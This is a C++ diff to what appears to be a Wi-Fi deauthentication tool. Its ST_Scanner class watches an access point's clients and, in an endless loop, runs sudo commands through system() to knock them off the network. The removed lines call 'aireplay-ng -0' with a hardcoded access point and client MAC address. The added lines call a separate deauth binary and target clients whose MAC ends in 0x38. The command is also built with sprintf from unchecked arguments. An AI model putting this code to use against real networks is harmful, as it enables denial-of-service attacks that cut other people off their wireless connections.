@@ -18,16 +18,15 @@
 
 
 
-ST_Scanner::ST_Scanner(AP_info_tiny const &AP, char const * Iface)
+ST_Scanner::ST_Scanner(path const & bin, AP_info_tiny const &AP, char const * Iface)
   : m_lopt{}
-	, m_Deauth{AP.bssid, Iface}
 	, m_Scanner{scanning, AP.bssid, AP.channel, Iface, std::ref(m_lopt)}
-	, m_Deauthenticator{deauthentacating, std::ref(m_lopt), std::ref(m_Stations), std::ref(m_Deauth)}
+	, m_Deauth{deauthentacating, AP.bssid, Iface, std::ref(m_lopt), std::ref(bin)}
 {}
 
 ST_Scanner::~ST_Scanner() {
   m_Scanner.join();
-	m_Deauthenticator.join();
+	m_Deauth.join();
 }
 
 ST_info_tiny::ST_info_tiny(uint8_t const * stmac_in) {
@@ -39,9 +38,10 @@ void ST_info_tiny::Print() const {
   printf("%02x\n", stmac[5]);
 }
 
-void ST_Scanner::deauthentacating(local_options & lopt, Stations & stations, Deauth & deauth) {
-
+void ST_Scanner::deauthentacating(uint8_t const * BSSID, char const * iface, local_options & lopt, path const & bin) {
 	static int sent = 0;
+
+	path deauth_bin = bin + "../deauth/deauth";
 
 	while(1) {
 
@@ -68,21 +68,18 @@ void ST_Scanner::deauthentacating(local_options & lopt, Stations & stations, Dea
 
 		lopt.m_data.unlock();
 
-		uint8_t s[] = {0x3e, 0x3d, 0xb5, 0x81, 0x9d, 0x38};
-		// sleep(1);
-		// deauth.SendPacket(s);
-		// sleep(10);
 		for (auto &&x : sts) {
-			// deauth.SendPacket(x.stmac);
-			// deauth.SendPacket(s);
+			if (x.stmac[5] != 0x38)
+				continue;
 
 			char command[1024];
 			sprintf(command,
-				"sudo aireplay-ng -0 2 -a c4:71:54:b5:3a:4a -c %02x:%02x:%02x:%02x:%02x:%02x wlan0mon",
-				x.stmac[0],x.stmac[1],x.stmac[2],x.stmac[3],x.stmac[4],x.stmac[5]
+				"sudo %s %02x:%02x:%02x:%02x:%02x:%02x %02x:%02x:%02x:%02x:%02x:%02x %s",
+				deauth_bin.getRaw(),
+				BSSID[0],BSSID[1],BSSID[2],BSSID[3],BSSID[4],BSSID[5],
+				x.stmac[0],x.stmac[1],x.stmac[2],x.stmac[3],x.stmac[4],x.stmac[5],
+				iface
 			);
-			std::cout << command << std::endl;
-
 			system(command);
 		}
 		usleep(10000);
